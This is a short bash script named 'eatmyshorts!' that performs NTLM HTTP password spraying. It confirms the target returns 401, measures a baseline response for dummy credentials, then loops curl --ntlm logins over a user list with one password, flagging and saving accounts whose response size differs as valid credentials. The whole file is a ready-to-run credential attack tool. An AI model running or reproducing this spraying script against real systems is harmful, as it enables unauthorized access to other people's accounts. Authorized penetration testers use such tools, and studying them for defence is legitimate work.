#!/bin/bash
#
# eatmyshorts! -> ntlm-auth http spray
#
# w41l3r
#
echo ''
echo ' ___      ___                  __        __   __  ___  __    /'
echo '|__   /\   |      |\/| \ /    /__` |__| /  \ |__)  |  /__`  /'
echo '|___ /~~\  |      |  |  |     .__/ |  | \__/ |  \  |  .__/ . '
echo ''                       

URL=$1
USERS=$2
PASS=$3

if [ $# -ne 3 ];then
	echo "Syntax: $0 {URL} {Users_file} {Password}"
	echo
	echo "e.g.: $0 https://abc.com users.txt Password1"
	echo "ps. users format: user@domain.com"
	echo "bye!"
	exit 9
fi

if [ ! -s $USERS ];then
	echo "File $USERS empty or doesnt exist. Bye..."
	exit 1
fi

RETRCODE=`curl -s -w '%{http_code}' -o /dev/null $URL`
if [ $RETRCODE -ne 401 ];then
	echo "Is it really an ntlm-authenticated site?"
	echo "bye..."
	exit 1
fi

BASERETR=`curl -s -w '%{size_download}' -k -L --ntlm --user "xxxxxxxxxxx:yyyyyyyyyyy" -o /dev/null  $URL`
OUTFILE="eatmyshorts-output-`date +%d%b%H%M`.txt"
> $OUTFILE
if [ $? -ne 0 ];then
	echo "Error generating output file here on $PWD ! check permissions..."
	exit 1
fi

cat $USERS | while read user
do
	echo "Testing $user ..."
	RETRSIZE=`curl -s -w '%{size_download}' -k -L --ntlm --user "${user}:${PASS}" $URL -o output/${user}.html`
	if [ $RETRSIZE -ne $BASERETR ];then
		echo -e "[*] Valid credential found!!! -> \033[32m${user}\033[0m "
		echo $user >> $OUTFILE
	fi
done

echo "Done."
echo
if [ -s $OUTFILE ];then
	echo "We've found some creds! Valid credentials/users are in $OUTFILE "
else
	echo "No valid creds found with $PASS"
fi
echo
echo "Adios muchacho!!"
echo
exit 0
